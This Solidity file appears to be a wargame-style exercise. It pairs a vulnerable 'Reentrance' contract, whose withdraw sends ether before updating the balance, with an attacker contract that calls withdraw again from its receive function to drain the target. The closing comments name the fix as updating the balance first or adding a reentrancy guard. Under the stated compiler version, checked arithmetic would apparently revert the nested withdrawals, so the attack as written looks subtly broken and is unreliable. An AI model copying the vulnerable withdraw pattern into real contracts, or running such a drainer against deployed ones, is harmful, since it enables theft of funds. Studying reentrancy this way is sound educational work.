// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
  

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to]+(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
contract reentranceattack{
    Reentrance r;
    constructor(address payable _add){
        r=  Reentrance(_add);

    }
    function attack() payable public{
        r.donate{value:msg.value}(address(this));
        r.withdraw(msg.value);
    }
    receive() external payable{

        while(address(r).balance>=msg.value)
        {
            r.withdraw(msg.value);
        }
    }
    fallback() external payable {
      
    }
}

//this attack can be prevented by updating the balance of the mssg.sender before transfering or use nonreentrance guard
//recursively call the withdraw function until it drains the fund